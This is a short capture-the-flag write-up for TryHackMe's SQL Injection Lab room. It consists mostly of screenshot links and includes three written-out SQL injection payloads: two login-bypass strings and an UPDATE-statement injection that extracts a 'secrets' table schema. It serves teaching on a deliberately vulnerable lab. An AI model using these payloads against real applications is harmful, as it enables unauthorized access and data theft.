
![](sqlilab.png)

[https://tryhackme.com/room/sqlilab](https://tryhackme.com/room/sqlilab)

This room, [SQL Injection Lab](https://tryhackme.com/r/room/sqlilab), is meant as an introduction to SQL injection and demonstrates various SQL injection attacks. It is not meant as a way to learn the SQL language itself. Some previous knowledge of the SQL language is highly recommended.

## Injection 1 : Input Box Non-String

![](Injection%201/1.png)

```sql
1 or 1=1-- -
``` 

![](Injection%201/2.png)

**FLAG :**

![](Injection%201/3.png)

## Injection 2 : Input Box String

![](Injection%202/1.png)

```sql
1' or '1'='1'-- -
```

![](Injection%202/2.png)

**FLAG :**

![](Injection%202/3.png)

## Injection 3 : URL Injection

![](Injection%203/1.png)

![](Injection%203/2.png)

![](Injection%203/3.png)

![](Injection%203/4.png)

**FLAG :**

![](Injection%203/5.png)

## Injection 4 : POST Injection

![](Injection%204/1.png)

![](Injection%204/2.png)

![](Injection%204/3.png)

![](Injection%204/4.png)

![](Injection%204/5.png)

![](Injection%204/6.png)

![](Injection%204/7.png)

![](Injection%204/8.png)

![](Injection%204/9.png)

**FLAG :**

![](Injection%204/10.png)

## Injection 5 : UPDATE Statement

- Préalable :

![](Injection%205/1.png)

![](Injection%205/2.png)

![](Injection%205/3.png)

---

![](Injection%205/0.1.png)

![](Injection%205/0.2.png)

![](Injection%205/0.3.png)

![](Injection%205/0.4.png)

![](Injection%205/0.5.png)

![](Injection%205/0.6.png)

![](Injection%205/0.7.png)

![](Injection%205/0.8.png)

![](Injection%205/0.9.png)

![](Injection%205/0.10.png)

![](Injection%205/0.11.png)

![](Injection%205/0.12.png)

```
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
```

![](Injection%205/0.13.png)

**FLAG :**

![](Injection%205/0.14.png)